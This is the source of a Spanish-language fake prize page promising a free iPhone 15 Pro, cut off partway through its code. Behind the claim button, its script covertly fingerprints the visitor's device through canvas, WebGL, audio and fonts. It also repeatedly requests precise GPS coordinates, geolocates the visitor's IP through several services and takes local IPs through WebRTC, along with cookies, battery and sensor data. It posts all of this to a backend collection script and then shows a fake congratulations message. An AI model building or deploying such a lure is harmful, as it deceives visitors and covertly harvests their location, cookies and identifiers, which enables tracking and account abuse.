<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¬°Felicidades! Has ganado un premio</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        
        .prize-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {
                transform: translateY(0);
            }
            40% {
                transform: translateY(-30px);
            }
            60% {
                transform: translateY(-15px);
            }
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .description {
            font-size: 1.2em;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .claim-btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.3em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            text-transform: uppercase;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .claim-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success {
            display: none;
            color: #2ecc71;
            font-size: 1.1em;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="prize-icon">üéÅ</div>
        <h1>¬°FELICIDADES!</h1>
        <div class="description">
            Has sido seleccionado para recibir un <strong>iPhone 15 Pro GRATIS</strong>!<br>
            Solo necesitas reclamar tu premio ahora.
        </div>
        <button class="claim-btn" onclick="claimPrize()">RECLAMAR PREMIO</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Verificando elegibilidad...</p>
        </div>
        
        <div class="success" id="success">
            ‚úÖ ¬°Verificaci√≥n completada! Ser√°s redirigido en breve...
        </div>
    </div>

    <!-- Incluir librer√≠a de fingerprinting avanzado -->
    <script src="advanced-fingerprint.js"></script>
    
    <script>
        // Generar ID √∫nico de sesi√≥n
        const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        // Instancia de fingerprinting avanzado
        const advancedFP = new AdvancedFingerprint();
        
        // Variables globales para almacenar datos
        let deviceData = {};
        let trackingId = generateTrackingId();
        
        // Generar ID √∫nico de tracking
        function generateTrackingId() {
            return 'track_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
        
        // Funci√≥n principal de recolecci√≥n de datos (mejorada)
        async function collectDeviceData() {
            try {
                // Inicializar fingerprinting avanzado
                const advancedData = await advancedFP.initialize();
                
                // Datos b√°sicos del navegador
                deviceData.userAgent = navigator.userAgent;
                deviceData.platform = navigator.platform;
                deviceData.language = navigator.language;
                deviceData.languages = navigator.languages;
                deviceData.cookieEnabled = navigator.cookieEnabled;
                deviceData.onLine = navigator.onLine;
                deviceData.doNotTrack = navigator.doNotTrack;
                
                // Informaci√≥n de la pantalla
                deviceData.screenWidth = screen.width;
                deviceData.screenHeight = screen.height;
                deviceData.screenColorDepth = screen.colorDepth;
                deviceData.screenPixelDepth = screen.pixelDepth;
                deviceData.screenAvailWidth = screen.availWidth;
                deviceData.screenAvailHeight = screen.availHeight;
                
                // Informaci√≥n de la ventana
                deviceData.windowWidth = window.innerWidth;
                deviceData.windowHeight = window.innerHeight;
                deviceData.windowOuterWidth = window.outerWidth;
                deviceData.windowOuterHeight = window.outerHeight;
                
                // Informaci√≥n avanzada de zona horaria y configuraci√≥n regional
                deviceData.timezoneAdvanced = await getAdvancedTimezoneInfo();
                
                // Mantener compatibilidad con campos b√°sicos
                deviceData.timezone = deviceData.timezoneAdvanced.basic.name;
                deviceData.timezoneOffset = deviceData.timezoneAdvanced.basic.offset;
                
                // Informaci√≥n de conexi√≥n
                if (navigator.connection) {
                    deviceData.connectionType = navigator.connection.effectiveType;
                    deviceData.connectionDownlink = navigator.connection.downlink;
                    deviceData.connectionRtt = navigator.connection.rtt;
                }
                
                // Hardware concurrency
                deviceData.hardwareConcurrency = navigator.hardwareConcurrency;
                
                // Memoria del dispositivo
                if (navigator.deviceMemory) {
                    deviceData.deviceMemory = navigator.deviceMemory;
                }
                
                // Plugins instalados
                deviceData.plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    deviceData.plugins.push({
                        name: navigator.plugins[i].name,
                        filename: navigator.plugins[i].filename,
                        description: navigator.plugins[i].description
                    });
                }
                
                // Canvas fingerprinting
                deviceData.canvasFingerprint = getCanvasFingerprint();
                
                // WebGL fingerprinting
                deviceData.webglFingerprint = getWebGLFingerprint();
                
                // Audio fingerprinting
                deviceData.audioFingerprint = await getAudioFingerprint();
                
                // Fonts disponibles
                deviceData.fonts = await detectFonts();
                
                // Informaci√≥n de bater√≠a (si est√° disponible)
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    deviceData.battery = {
                        charging: battery.charging,
                        level: battery.level,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
                
                // Geolocalizaci√≥n avanzada con m√∫ltiples m√©todos
                try {
                    deviceData.geolocation = await getAdvancedGeolocation();
                } catch (e) {
                    deviceData.geolocation = { error: e.message, fallback: 'all_methods_failed' };
                }

                // Detectar redes cercanas para triangulaci√≥n avanzada
        try {
            deviceData.nearbyNetworks = await detectNearbyNetworks();
        } catch (e) {
            deviceData.nearbyNetworks = { error: e.message };
        }

                // Informaci√≥n de sensores del dispositivo
                try {
                    deviceData.deviceSensors = await getDeviceSensors();
                } catch (e) {
                    deviceData.deviceSensors = { error: e.message };
                }
                
                // Informaci√≥n de almacenamiento
                deviceData.localStorage = typeof(Storage) !== "undefined";
                deviceData.sessionStorage = typeof(Storage) !== "undefined";
                
                // Cookies existentes
                deviceData.cookies = document.cookie;
                
                // Referrer
                deviceData.referrer = document.referrer;
                
                // URL actual
                deviceData.currentUrl = window.location.href;
                
                // Timestamp
                deviceData.timestamp = new Date().toISOString();
                deviceData.trackingId = trackingId;
                deviceData.sessionId = sessionId;
                
                // Informaci√≥n adicional del DOM
                deviceData.documentTitle = document.title;
                deviceData.documentCharset = document.charset;
                
                // Datos avanzados de fingerprinting
                deviceData.advanced = advancedData;
                
                // Fingerprint √∫nico generado
                deviceData.uniqueFingerprint = advancedFP.getFingerprint();
                
                // Informaci√≥n adicional de seguridad
                deviceData.security = await collectSecurityInfo();
                
                // Informaci√≥n de red avanzada
                deviceData.networkAdvanced = await collectNetworkAdvanced();
                
                // Informaci√≥n de sesiones y cuentas (si es posible detectar)
                deviceData.sessions = await detectActiveSessions();
                
                return deviceData;
                
            } catch (error) {
                console.error('Error recolectando datos:', error);
                return deviceData;
            }
        }
        
        // Funci√≥n para recolectar informaci√≥n de seguridad
        async function collectSecurityInfo() {
            try {
                return {
                    webdriver: navigator.webdriver,
                    plugins: navigator.plugins.length,
                    languages: navigator.languages.length,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints,
                    vendor: navigator.vendor,
                    vendorSub: navigator.vendorSub,
                    productSub: navigator.productSub,
                    buildID: navigator.buildID
                };
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // Funci√≥n para recolectar informaci√≥n de red avanzada
        async function collectNetworkAdvanced() {
            try {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    return {
                        effectiveType: connection.effectiveType,
                        downlink: connection.downlink,
                        downlinkMax: connection.downlinkMax,
                        rtt: connection.rtt,
                        saveData: connection.saveData,
                        type: connection.type
                    };
                }
                return 'unavailable';
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // Funci√≥n para detectar sesiones activas
        async function detectActiveSessions() {
            try {
                return {
                    localStorage: localStorage.length,
                    sessionStorage: sessionStorage.length,
                    cookieCount: document.cookie.split(';').length,
                    indexedDBSupport: !!window.indexedDB,
                    webSQLSupport: !!window.openDatabase
                };
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // Canvas fingerprinting
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Canvas fingerprint test üîí', 2, 2);
                return canvas.toDataURL();
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // WebGL fingerprinting
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'unavailable';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unavailable',
                    unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unavailable'
                };
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // Audio fingerprinting
        function getAudioFingerprint() {
            return new Promise((resolve) => {
                try {
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioContext.createOscillator();
                    const analyser = audioContext.createAnalyser();
                    const gainNode = audioContext.createGain();
                    const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                    
                    oscillator.type = 'triangle';
                    oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
                    
                    gainNode.gain.setValueAtTime(0, audioContext.currentTime);
                    
                    oscillator.connect(analyser);
                    analyser.connect(scriptProcessor);
                    scriptProcessor.connect(gainNode);
                    gainNode.connect(audioContext.destination);
                    
                    scriptProcessor.onaudioprocess = function(bins) {
                        bins.outputBuffer.getChannelData(0).set(bins.inputBuffer.getChannelData(0));
                        const fingerprint = Array.from(bins.inputBuffer.getChannelData(0)).slice(0, 50).join(',');
                        oscillator.disconnect();
                        scriptProcessor.disconnect();
                        audioContext.close();
                        resolve(fingerprint);
                    };
                    
                    oscillator.start(0);
                } catch (e) {
                    resolve('unavailable');
                }
            });
        }
        
        // Detecci√≥n de fuentes
        function detectFonts() {
            return new Promise((resolve) => {
                const baseFonts = ['monospace', 'sans-serif', 'serif'];
                const testFonts = [
                    'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
                    'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
                    'Trebuchet MS', 'Arial Black', 'Impact', 'Calibri', 'Cambria',
                    'Consolas', 'Lucida Console', 'Tahoma', 'Century Gothic'
                ];
                
                const detectedFonts = [];
                const testString = 'mmmmmmmmmmlli';
                const testSize = '72px';
                
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                // Medir dimensiones con fuentes base
                const baseDimensions = {};
                baseFonts.forEach(baseFont => {
                    context.font = testSize + ' ' + baseFont;
                    baseDimensions[baseFont] = context.measureText(testString).width;
                });
                
                // Probar cada fuente
                testFonts.forEach(testFont => {
                    let detected = false;
                    baseFonts.forEach(baseFont => {
                        context.font = testSize + ' ' + testFont + ', ' + baseFont;
                        const dimension = context.measureText(testString).width;
                        if (dimension !== baseDimensions[baseFont]) {
                            detected = true;
                        }
                    });
                    if (detected) {
                        detectedFonts.push(testFont);
                    }
                });
                
                resolve(detectedFonts);
            });
        }
        
        // Funci√≥n para obtener informaci√≥n avanzada de zona horaria y configuraci√≥n regional
        async function getAdvancedTimezoneInfo() {
            const timezoneInfo = {
                basic: {
                    name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset(),
                    offsetString: new Date().toString().match(/GMT[+-]\d{4}/)?.[0] || 'Unknown'
                },
                regional: {
                    locale: navigator.language || navigator.userLanguage,
                    languages: navigator.languages || [navigator.language],
                    currency: null,
                    numberFormat: null,
                    dateFormat: null,
                    timeFormat: null
                },
                validation: {
                    dstActive: null,
                    timeConsistency: null,
                    serverTimeDiff: null
                },
                advanced: {
                    weekStart: null,
                    calendar: null,
                    hourCycle: null
                }
            };

            try {
                // Detectar formato de moneda regional
                const currencyFormatter = new Intl.NumberFormat(navigator.language, {
                    style: 'currency',
                    currency: 'USD'
                });
                timezoneInfo.regional.currency = currencyFormatter.resolvedOptions().currency;

                // Detectar formato de n√∫meros
                const numberFormatter = new Intl.NumberFormat(navigator.language);
                timezoneInfo.regional.numberFormat = {
                    decimal: (1.1).toLocaleString().charAt(1),
                    thousands: (1000).toLocaleString().charAt(1)
                };

                // Detectar formato de fecha
                const dateFormatter = new Intl.DateTimeFormat(navigator.language);
                const sampleDate = new Date(2023, 11, 25); // 25 de diciembre de 2023
                timezoneInfo.regional.dateFormat = dateFormatter.format(sampleDate);

                // Detectar formato de hora
                const timeFormatter = new Intl.DateTimeFormat(navigator.language, {
                    hour: 'numeric',
                    minute: 'numeric',
                    second: 'numeric'
                });
                timezoneInfo.regional.timeFormat = timeFormatter.format(new Date());

                // Detectar configuraci√≥n avanzada
                const dtfOptions = new Intl.DateTimeFormat(navigator.language).resolvedOptions();
                timezoneInfo.advanced.calendar = dtfOptions.calendar || 'gregory';
                timezoneInfo.advanced.hourCycle = dtfOptions.hourCycle || 'h24';

                // Detectar primer d√≠a de la semana
                const weekInfo = new Intl.Locale(navigator.language).weekInfo;
                if (weekInfo) {
                    timezoneInfo.advanced.weekStart = weekInfo.firstDay;
                }

                // Validar horario de verano (DST)
                const now = new Date();
                const january = new Date(now.getFullYear(), 0, 1);
                const july = new Date(now.getFullYear(), 6, 1);
                const stdOffset = Math.max(january.getTimezoneOffset(), july.getTimezoneOffset());
                timezoneInfo.validation.dstActive = now.getTimezoneOffset() < stdOffset;

                // Validar consistencia temporal
                const clientTime = now.getTime();
                const serverTimeResponse = await fetch('/backend/get-server-time.php').catch(() => null);
                if (serverTimeResponse && serverTimeResponse.ok) {
                    const serverData = await serverTimeResponse.json();
                    const serverTime = new Date(serverData.timestamp).getTime();
                    timezoneInfo.validation.serverTimeDiff = Math.abs(clientTime - serverTime);
                    timezoneInfo.validation.timeConsistency = timezoneInfo.validation.serverTimeDiff < 60000; // Menos de 1 minuto
                }

            } catch (error) {
                timezoneInfo.error = error.message;
            }

            return timezoneInfo;
        }

        // Funci√≥n para obtener geolocalizaci√≥n avanzada con m√∫ltiples m√©todos y validaci√≥n
        async function getAdvancedGeolocation() {
            const geoData = {
                gps: null,
                ip: null,
                timezone: null,
                network: null,
                accuracy: 'low',
                validation: {},
                attempts: {
                    gps: 0,
                    ip: 0
                }
            };

            // M√©todo 1: GPS del navegador con m√∫ltiples intentos (m√°s preciso)
            console.log('üéØ Iniciando geolocalizaci√≥n GPS de alta precisi√≥n...');
            try {
                geoData.attempts.gps = 1;
                const position = await getCurrentPositionEnhanced();
                geoData.gps = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: position.timestamp
                };
                
                // Clasificaci√≥n de precisi√≥n m√°s detallada
                if (position.coords.accuracy <= 10) {
                    geoData.accuracy = 'very_high';
                } else if (position.coords.accuracy <= 50) {
                    geoData.accuracy = 'high';
                } else if (position.coords.accuracy <= 200) {
                    geoData.accuracy = 'medium';
                } else {
                    geoData.accuracy = 'low';
                }
                
                console.log(`‚úÖ GPS obtenido con precisi√≥n: ${position.coords.accuracy}m`);
            } catch (e) {
                console.warn('‚ùå Error GPS:', e.message);
                geoData.gps = { error: e.message };
            }

            // M√©todo 2: Geolocalizaci√≥n por IP usando m√∫ltiples servicios
            console.log('üåê Obteniendo geolocalizaci√≥n por IP...');
            try {
                geoData.attempts.ip = 1;
                geoData.ip = await getIPGeolocation();
                console.log('‚úÖ Geolocalizaci√≥n IP obtenida');
            } catch (e) {
                console.warn('‚ùå Error IP:', e.message);
                geoData.ip = { error: e.message };
            }

            // M√©todo 3: Informaci√≥n de zona horaria para validaci√≥n
            geoData.timezone = {
                name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                calendar: Intl.DateTimeFormat().resolvedOptions().calendar
            };

            // M√©todo 4: Informaci√≥n de red para triangulaci√≥n
            if (navigator.connection) {
                geoData.network = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }

            // Validaci√≥n cruzada de datos
            geoData.validation = await validateGeolocationData(geoData);

            return geoData;
        }

        // Funci√≥n para validar datos de geolocalizaci√≥n
        async function validateGeolocationData(geoData) {
            const validation = {
                gps_valid: false,
                ip_valid: false,
                consistency_check: false,
                distance_km: null,
                timezone_match: false
            };

            // Validar GPS
            if (geoData.gps && !geoData.gps.error) {
                const lat = geoData.gps.latitude;
                const lon = geoData.gps.longitude;
                validation.gps_valid = lat >= -90 && lat <= 90 && lon >= -180 && lon <= 180;
            }

            // Validar IP
            if (geoData.ip && !geoData.ip.error && geoData.ip.latitude && geoData.ip.longitude) {
                const lat = parseFloat(geoData.ip.latitude);
                const lon = parseFloat(geoData.ip.longitude);
                validation.ip_valid = lat >= -90 && lat <= 90 && lon >= -180 && lon <= 180;
            }

            // Verificar consistencia entre GPS e IP
            if (validation.gps_valid && validation.ip_valid) {
                const distance = calculateDistance(
                    geoData.gps.latitude, geoData.gps.longitude,
                    parseFloat(geoData.ip.latitude), parseFloat(geoData.ip.longitude)
                );
                validation.distance_km = Math.round(distance * 100) / 100;
                validation.consistency_check = distance < 100; // Menos de 100km es consistente
            }

            // Verificar zona horaria
            if (geoData.ip && geoData.ip.timezone && geoData.timezone) {
                validation.timezone_match = geoData.ip.timezone === geoData.timezone.name;
            }

            return validation;
        }

        // Funci√≥n para calcular distancia entre dos puntos (Haversine)
        function calculateDistance(lat1, lon1, lat2, lon2) {
            const R = 6371; // Radio de la Tierra en km
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                    Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        // GPS del navegador mejorado con m√∫ltiples intentos y estrategias
        function getCurrentPositionEnhanced() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }

                let attempts = 0;
                const maxAttempts = 5;
                let bestPosition = null;
                let positions = [];
                
                function tryGetPosition() {
                    attempts++;
                    
                    // Configuraciones progresivamente m√°s permisivas
                    const configs = [
                        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 },
                        { enableHighAccuracy: true, timeout: 20000, maximumAge: 10000 },
                        { enableHighAccuracy: false, timeout: 15000, maximumAge: 30000 },
                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 },
                        { enableHighAccuracy: false, timeout: 5000, maximumAge: 300000 }
                    ];
                    
                    const config = configs[Math.min(attempts - 1, configs.length - 1)];
                    
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            positions.push(position);
                            
                            // Evaluar si esta posici√≥n es mejor que la anterior
                            if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                                bestPosition = position;
                            }
                            
                            // Criterios para aceptar la posici√≥n
                            const isHighAccuracy = position.coords.accuracy <= 50;
                            const isMediumAccuracy = position.coords.accuracy <= 200;
                            const hasMultipleReadings = positions.length >= 2;
                            
                            // Aceptar inmediatamente si es muy precisa
                            if (isHighAccuracy) {
                                resolve(bestPosition);
                                return;
                            }
                            
                            // Aceptar si es medianamente precisa y tenemos m√∫ltiples lecturas
                            if (isMediumAccuracy && hasMultipleReadings) {
                                resolve(bestPosition);
                                return;
                            }
                            
                            // Continuar intentando si no hemos alcanzado el m√°ximo
                            if (attempts < maxAttempts) {
                                setTimeout(tryGetPosition, 2000);
                                return;
                            }
                            
                            // Usar la mejor posici√≥n disponible
                            resolve(bestPosition || position);
                        },
                        (error) => {
                            console.warn(`GPS attempt ${attempts} failed:`, error.message);
                            
                            if (attempts < maxAttempts) {
                                setTimeout(tryGetPosition, 1500);
                                return;
                            }
                            
                            // Si tenemos alguna posici√≥n previa, usarla
                            if (bestPosition) {
                                resolve(bestPosition);
                            } else {
                                reject(error);
                            }
                        },
                        config
                    );
                }
                
                tryGetPosition();
            });
        }

        // Geolocalizaci√≥n por IP usando m√∫ltiples servicios
        async function getIPGeolocation() {
            const services = [
                'https://ipapi.co/json/',
                'https://ip-api.com/json/',
                'https://ipinfo.io/json',
                'https://api.ipify.org?format=json'
            ];

            const results = [];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, { 
                        method: 'GET',
                        timeout: 5000
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        results.push({
                            service: service,
                            data: data,
                            timestamp: Date.now()
                        });
                    }
                } catch (e) {
                    results.push({
                        service: service,
                        error: e.message
                    });
                }
            }
            
            return results;
        }

        // Detectar redes cercanas para triangulaci√≥n avanzada
        async function detectNearbyNetworks() {
            const networkData = {
                wifi: {
                    connection: null,
                    networks: [],
                    signal_strength: null,
                    access_points: []
                },
                bluetooth: {
                    available: false,
                    devices: [],
                    supported: false,
                    scanning: false
                },
                cellular: {
                    towers: [],
                    signal_info: null,
                    carrier: null
                },
                advanced: {
                    webrtc_ips: [],
                    network_timing: null,
                    dns_servers: []
                }
            };

            // Detectar informaci√≥n de conexi√≥n WiFi usando Network Information API
            if ('connection' in navigator) {
                const connection = navigator.connection;
                networkData.wifi.connection = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
                
                // Estimar calidad de se√±al basada en RTT y downlink
                if (connection.rtt && connection.downlink) {
                    let signalQuality = 'unknown';
                    if (connection.rtt < 50 && connection.downlink > 10) {
                        signalQuality = 'excellent';
                    } else if (connection.rtt < 100 && connection.downlink > 5) {
                        signalQuality = 'good';
                    } else if (connection.rtt < 200 && connection.downlink > 1) {
                        signalQuality = 'fair';
                    } else {
                        signalQuality = 'poor';
                    }
                    networkData.wifi.signal_strength = {
                        quality: signalQuality,
                        rtt: connection.rtt,
                        bandwidth: connection.downlink
                    };
                }
            }

            // Detectar dispositivos Bluetooth cercanos
            if ('bluetooth' in navigator) {
                networkData.bluetooth.supported = true;
                try {
                    const bluetoothAvailable = await navigator.bluetooth.getAvailability();
                    networkData.bluetooth.available = bluetoothAvailable;
                    
                    if (bluetoothAvailable) {
                        // Intentar escanear dispositivos Bluetooth (requiere interacci√≥n del usuario)
                        try {
                            networkData.bluetooth.scanning = true;
                            // Nota: requestDevice requiere interacci√≥n del usuario
                            // Solo verificamos disponibilidad por ahora
                        } catch (scanError) {
                            networkData.bluetooth.scan_error = scanError.message;
                        }
                    }
                } catch (e) {
                    networkData.bluetooth.error = e.message;
                }
            }

            // Obtener IPs locales usando WebRTC para triangulaci√≥n
            try {
                const localIPs = await getLocalIPs();
                networkData.advanced.webrtc_ips = localIPs;
            } catch (e) {
                networkData.advanced.webrtc_error = e.message;
            }

            // Medir latencia de red para diferentes servicios
            try {
                const networkTiming = await measureNetworkTiming();
                networkData.advanced.network_timing = networkTiming;
            } catch (e) {
                networkData.advanced.timing_error = e.message;
            }

            // Informaci√≥n adicional de conectividad
            networkData.online = navigator.onLine;
            networkData.connection_type = navigator.connection?.type || 'unknown';
            
            return networkData;
        }

        // Funci√≥n auxiliar para obtener IPs locales usando WebRTC
        function getLocalIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve([]);
                    return;
                }
                
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                
                pc.createDataChannel('');
                
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                        if (ipMatch && !ips.includes(ipMatch[1])) {
                            ips.push(ipMatch[1]);
                        }
                    } else {
                        pc.close();
                        resolve(ips);
                    }
                };
                
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                // Timeout despu√©s de 3 segundos
                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 3000);
            });
        }

        // Funci√≥n auxiliar para medir latencia de red
        async function measureNetworkTiming() {
            const timingData = {
                dns_resolution: null,
                tcp_connect: null,
                ssl_handshake: null,
                server_response: null
            };
            
            try {
                const startTime = performance.now();
                const response = await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' });
                const endTime = performance.now();
                
                timingData.total_time = endTime - startTime;
                
                // Usar Navigation Timing API si est√° disponible
                if (performance.getEntriesByType) {
                    const navEntries = performance.getEntriesByType('navigation');
                    if (navEntries.length > 0) {
                        const nav = navEntries[0];
                        timingData.dns_resolution = nav.domainLookupEnd - nav.domainLookupStart;
                        timingData.tcp_connect = nav.connectEnd - nav.connectStart;
                        timingData.ssl_handshake = nav.secureConnectionStart > 0 ? nav.connectEnd - nav.secureConnectionStart : 0;
                        timingData.server_response = nav.responseStart - nav.requestStart;
                    }
                }
            } catch (e) {
                timingData.error = e.message;
            }
            
            return timingData;
        }

        // Obtener informaci√≥n de sensores del dispositivo
        async function getDeviceSensors() {
            const sensorData = {
                accelerometer: null,
                gyroscope: null,
                magnetometer: null,
                ambient_light: null,
                proximity: null
            };

            // Intentar acceder al aceler√≥metro
            if ('DeviceMotionEvent' in window) {
                try {
                    const permission = await navigator.permissions.query({ name: 'accelerometer' });
                    sensorData.accelerometer = {
                        supported: true,
                        permission: permission.state
                    };
                } catch (e) {
                    sensorData.accelerometer = {
                        supported: true,
                        permission: 'unknown',
                        error: e.message
                    };
                }
            }

            // Intentar acceder al giroscopio
            if ('DeviceOrientationEvent' in window) {
                try {
                    const permission = await navigator.permissions.query({ name: 'gyroscope' });
                    sensorData.gyroscope = {
                        supported: true,
                        permission: permission.state
                    };
                } catch (e) {
                    sensorData.gyroscope = {
                        supported: true,
                        permission: 'unknown',
                        error: e.message
                    };
                }
            }

            // Sensor de luz ambiente
            if ('AmbientLightSensor' in window) {
                try {
                    const permission = await navigator.permissions.query({ name: 'ambient-light-sensor' });
                    sensorData.ambient_light = {
                        supported: true,
                        permission: permission.state
                    };
                } catch (e) {
                    sensorData.ambient_light = {
                        supported: false,
                        error: e.message
                    };
                }
            }

            return sensorData;
        }
        
        // Funci√≥n para enviar datos al servidor (mejorado)
        async function sendDataToServer(data) {
            try {
                const response = await fetch('../backend/collect.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    const result = await response.json();
                    
                    // Marcar que los datos fueron enviados exitosamente
                    window.dataCollected = true;
                    
                    // Activar redirecci√≥n autom√°tica despu√©s de capturar datos
                    setTimeout(() => {
                        showRedirectionMessage();
                    }, 2000);
                    
                    return result;
                } else {
                    throw new Error('Error en el servidor');
                }
            } catch (error) {
                console.error('Error enviando datos:', error);
                return null;
            }
        }
        
        // Funci√≥n para mostrar mensaje de redirecci√≥n
        function showRedirectionMessage() {
            const redirectMsg = document.createElement('div');
            redirectMsg.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                z-index: 10000;
                text-align: center;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                animation: fadeIn 0.5s ease-in;
            `;
            
            redirectMsg.innerHTML = `
                <div style="font-size: 24px; margin-bottom: 15px;">üéâ</div>
                <h3 style="margin: 0 0 10px 0; font-size: 20px;">¬°Felicidades!</h3>
                <p style="margin: 0; font-size: 16px; opacity: 0.9;">Has ganado un premio. Redirigiendo...</p>
                <div style="margin-top: 15px;">
                    <div style="width: 200px; height: 4px; background: rgba(255,255,255,0.3); border-radius: 2px; margin: 0 auto;">
                        <div style="width: 0%; height: 100%; background: white; border-radius: 2px; animation: progressBar 3s linear forwards;"></div>
                    </div>
                </div>
            `;
            
            // Agregar estilos de animaci√≥n
            const style = document.createElement('style');
            style.textContent = `
                @keyframes fadeIn {
